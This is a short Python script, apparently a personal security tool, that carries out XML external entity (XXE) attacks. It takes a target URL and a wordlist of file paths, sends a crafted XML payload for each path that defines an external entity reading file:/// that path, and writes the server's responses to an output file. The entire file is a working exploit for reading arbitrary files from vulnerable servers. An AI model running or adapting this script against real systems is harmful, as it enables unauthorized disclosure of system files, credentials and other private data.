#-*- coding:utf-8 -*-
# @Time    : 2020-04-29 16:38
# @Author  : nice0e3
# @FileName: xxe_file.py
# @Software: PyCharm
# @Blog    ：https://www.cnblogs.com/nice0e3/
'''Command：
python xxe_file.py http:/127.0.0.1/xxe1.php dir.txt
'''


import requests
import sys

def main():
    url = sys.argv[1]
    dir = sys.argv[2]
    f = open(dir,'r')

    for i in f.readlines():
        xxe(i.strip(),url)

def xxe(i,url):
    xml = '<?xml version="1.0" encoding="ISO-8859-1"?>'
    xml += '\n' + '<!DOCTYPE foo [ <!ELEMENT foo ANY >'
    xml += '\n' + '<!ENTITY xxe SYSTEM "' 'file:///' +i + '">]>'
    xml += '\n' + '<xml>'
    xml += '\n' + '<stuff>&xxe;</stuff>'
    xml += '\n' + '</xml>'
    r= requests.get(url=url,data=xml)
    print('path:'+i+'\n'+'---------------------------------------------------------------------------------------------')
    print(r.text)
    print('---------------------------------------------------------------------------------------------')
    text = r.text
    outfile = open('outfile.txt','a+')
    outfile.write('path:'+i+'\n')
    outfile.write('---------------------------------------------------------------------------------------------' + '\n')
    outfile.write(text+'---------------------------------------------------------------------------------------------'+'\n')

if __name__ == '__main__':
    main()